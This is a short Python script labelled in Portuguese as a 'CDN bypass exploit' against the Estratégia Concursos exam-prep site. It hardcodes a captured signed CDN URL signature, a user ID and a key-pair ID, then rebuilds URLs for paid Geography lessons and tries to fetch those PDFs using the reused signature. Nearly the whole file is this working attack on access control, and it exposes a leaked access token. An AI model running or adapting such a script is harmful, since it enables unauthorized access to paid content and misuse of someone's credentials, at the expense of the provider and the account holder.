import requests
import re

# URL base capturada da Aula 00 (Língua Portuguesa)
# https://cdn.estrategiaconcursos.com.br/storage/temp/aula/3641968/5893505/curso-364600-aula-00-9fd1-completo.pdf?Expires=1767480503&Signature=...&Key-Pair-Id=...

BASE_URL = "https://cdn.estrategiaconcursos.com.br/storage/temp/aula/"
USER_ID = "5893505"
SIGNATURE_PARAMS = "Expires=1767480503&Signature=KrvCYCRh-TFa6T3vDdUoUW8j-ybfikCnxfvms2teHRbn8UN6zNIoZYB4kcaJ3IwU-TXcfR2HgFtwDgqTZ~GqWFIQn7KpZB2lAcJygE3a0fLG4DK-Y3bPe~G~yBnXUauErIiFhaeY5aqHjMBv23uoOX6eGdoihd9pk3TluVf6bZm8wqAP0yldod7cO2YVUyZWibLpchWPuL0B53FWcbbPl6a3lBRsak8gsxep1W2Zr3OnNRA8-YU2Q~z4FqxeBkZh4zou8sNAPBEI81pNZebu-f31JMI9BSpGGm9hPH51RUmvg5DPWWZvCuc~vEvwIM2CFsAGr8LWghJyLZjFhDvG1w__&Key-Pair-Id=APKAIMR3QKSK2UDRJITQ"

def attempt_bypass(lesson_id, course_id, aula_num):
    # Tentando reconstruir a URL para uma aula paga (ex: Aula 01)
    # O padrão parece ser: {BASE_URL}/{lesson_id}/{user_id}/curso-{course_id}-aula-{aula_num}-{hash}-completo.pdf
    # O desafio é o hash (9fd1), mas vamos testar se a assinatura é válida para o diretório
    
    target_url = f"{BASE_URL}{lesson_id}/{USER_ID}/curso-{course_id}-aula-{aula_num}-completo.pdf?{SIGNATURE_PARAMS}"
    print(f"[*] Tentando bypass na URL: {target_url}")
    
    response = requests.get(target_url, timeout=10)
    if response.status_code == 200:
        print(f"[!!!] SUCESSO: Bypass de CDN realizado! Aula {aula_num} acessada.")
        return True
    else:
        print(f"[-] Falha: Status {response.status_code}")
        return False

if __name__ == "__main__":
    # IDs do curso de Geografia (Pós-Edital)
    GEOGRAFIA_COURSE_ID = 364593
    GEOGRAFIA_LESSON_ID = 3641789 # Aula 01
    
    print("=== ESTRATÉGIA CONCURSOS - CDN BYPASS EXPLOIT ===")
    attempt_bypass(GEOGRAFIA_LESSON_ID, GEOGRAFIA_COURSE_ID, "01")
